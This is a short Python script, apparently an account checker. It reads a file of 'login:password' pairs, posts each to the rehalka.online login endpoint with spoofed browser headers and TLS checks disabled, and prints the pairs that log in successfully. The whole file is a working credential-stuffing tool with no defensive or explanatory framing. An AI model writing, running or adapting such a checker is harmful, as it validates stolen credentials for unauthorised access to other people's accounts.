import requests
def check_rehalkaonline(user, password):
    headers = {
        'Accept': '*/*',
        'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'Origin': 'http://rehalka.online',
        'Referer': 'http://rehalka.online/log',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
    }

    json_data = {
        'user': user,
        'mail': 0,
        'pass': password,
    }

    response = requests.post('http://rehalka.online/auth/login', headers=headers, json=json_data, verify=False).status_code
    return response
file = input("Имя файла: ")
with open(file, "r", encoding="utf-8") as file:
    logpass = file.readlines()
    logpass = [i.strip() for i in logpass]
    for i in logpass:
        #print(i)
        user, password = i.split(":")
        if check_rehalkaonline(user, password) == 200:
            print(i)
        else:
            pass
